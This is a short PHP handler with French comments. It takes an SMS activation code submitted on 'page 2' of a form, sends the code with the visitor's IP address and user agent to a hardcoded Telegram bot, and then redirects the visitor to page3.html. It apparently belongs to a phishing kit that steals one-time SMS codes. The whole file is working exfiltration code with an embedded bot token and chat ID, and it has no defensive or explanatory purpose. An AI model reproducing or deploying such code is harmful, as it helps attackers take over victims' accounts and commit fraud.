<?php
// =================================================================
// CONFIGURATION
// =================================================================
$botToken = '8473826447:AAFqM5Efirefhh3AoU8y7AL9IxcamlyAVzU';
$chatId = '6705594800';

// =================================================================
// RÉCUPÉRATION DES DONNÉES DU FORMULAIRE (PAGE 2)
// =================================================================
// Le code d'activation vient du champ avec name="activation"
$activationCode = isset($_POST['activation']) && !empty(trim($_POST['activation'])) 
    ? trim($_POST['activation']) 
    : 'Non renseigné';

// =================================================================
// PRÉPARATION ET ENVOI DU MESSAGE À TELEGRAM
// =================================================================
$message = "✅ VALIDATION PAR SMS (Page 2)\n";
$message .= "-----------------------------------------\n";
$message .= "Code d'activation (SMS): " . htmlspecialchars($activationCode) . "\n";
$message .= "-----------------------------------------\n";
$message .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$message .= "User-Agent: " . htmlspecialchars($_SERVER['HTTP_USER_AGENT']) . "\n";

$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_exec($ch);
curl_close($ch);

// =================================================================
// REDIRECTION VERS LA PAGE 3
// =================================================================
header('Location: page3.html');
exit();

?>